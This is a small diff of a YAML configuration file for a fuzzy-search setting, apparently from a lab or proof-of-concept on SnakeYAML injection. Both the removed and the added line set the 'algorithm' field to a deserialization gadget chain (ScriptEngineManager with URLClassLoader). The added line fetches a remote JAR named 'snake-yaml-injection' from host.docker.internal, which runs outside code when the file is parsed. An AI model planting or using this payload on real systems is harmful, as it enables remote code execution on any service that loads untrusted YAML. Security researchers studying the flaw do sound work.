@@ -1,5 +1,5 @@
 !!FuzzySearchConfig
-algorithm: !!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL [ "http://127.0.0.1:8000" ] ] ]]
+algorithm: !!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL [ "http://host.docker.internal:8000/snake-yaml-injection-1.0-SNAPSHOT.jar" ] ] ]]
 
 maxDistance: 3
 
